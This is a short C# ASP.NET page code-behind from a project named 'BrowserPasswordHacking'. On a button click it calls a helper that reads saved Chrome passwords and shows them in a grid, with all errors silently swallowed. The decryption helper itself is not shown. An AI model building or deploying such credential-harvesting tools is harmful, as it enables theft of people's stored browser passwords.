using BrowserPasswordHacking.Helpers;
using System;
using System.Data;

namespace BrowserPasswordHacking
{
    public partial class DisplayPasswords : System.Web.UI.Page
    {
        ChromePasswords objChromePasswords = new ChromePasswords();
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        protected void btnReadPasswords_Click(object sender, EventArgs e)
        {
            try
            {
                DataTable dtResults = objChromePasswords.Passwords();
                if (dtResults != null && dtResults.Rows.Count > 0)
                {
                    gdResults.DataSource = dtResults;
                    gdResults.DataBind();
                }
            }
            catch { }
        }
    }
}